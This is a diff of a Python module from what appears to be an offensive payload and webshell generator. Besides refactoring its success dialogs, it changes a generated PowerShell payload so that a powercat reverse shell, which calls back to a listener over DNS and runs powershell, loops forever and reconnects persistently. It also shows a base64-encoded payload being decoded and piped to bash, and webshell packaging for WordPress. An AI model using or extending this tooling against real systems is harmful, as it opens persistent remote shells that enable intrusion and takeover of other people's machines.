@@ -7,8 +7,7 @@
 import os
 import base64
 import shutil
-from modules import compiler
-from modules import custom, obfuscator
+from modules import compiler, custom, obfuscator, dialog
 
 def generate_webshell(app, tail, format, obfuscate):
     if tail and format and obfuscate:
@@ -97,7 +96,7 @@ def generate_webshell(app, tail, format, obfuscate):
             dst_file = os.path.join(payloads_dir, "wordpress.zip")
             shutil.copy(src_file, dst_file)
 
-        app.generate_success()
+        dialog.generate_success(app)
         obfuscate = False
 
 def generate_payload(app, tail, file_format, listener_name):
@@ -199,7 +198,7 @@ def generate_payload(app, tail, file_format, listener_name):
                 with open(src_file, 'r') as file:
                     content = file.readlines()
                 
-                content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
+                content.append(f"\nwhile ($true) {{ powercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell }} \n")
                 
                 with open(dst_file, 'w') as file:
                     file.writelines(content)
@@ -396,4 +395,4 @@ done
                 content = "echo " + payload + " | base64 -di | bash"
                 compiler.create_py_file(content, dst_file)
 
-        app.generate_success()
+        dialog.generate_success(app)
